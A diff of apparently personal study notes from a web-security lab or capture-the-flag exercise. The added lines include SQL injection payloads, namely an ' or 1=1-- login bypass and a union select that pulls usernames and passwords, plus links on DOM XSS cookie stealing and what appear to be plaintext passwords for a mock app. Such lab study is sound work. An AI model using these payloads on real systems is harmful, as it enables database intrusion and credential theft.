@@ -10,6 +10,8 @@ password = ' or 1=1--
 query = f"SELECT name,category,price FROM items WHERE name = '{name}'"
 
 name = ' union select username, password, NULL from users--
+more accurate (above returns first in table probably):
+' union select username, password, NULL from users WHERE username = "superadmin" --
 
 
 >> dom-xss 
@@ -91,3 +93,14 @@ https://portswigger.net/web-security/sql-injection/union-attacks
 
 dom-xss/cross xss
 https://eitca.org/cybersecurity/eitc-is-wapt-web-applications-penetration-testing/web-attacks-practice/http-attributes-cookie-stealing/examination-review-http-attributes-cookie-stealing/how-can-cross-site-scripting-xss-attacks-be-used-to-steal-cookies/
+
+
+
+Website:
+
+passwords:
+superadmin, $youCantCrackMyPassword$
+user, #YouDontNeedThis#
+
+Flag isn't in the same dir as mock app (TODO later)
+
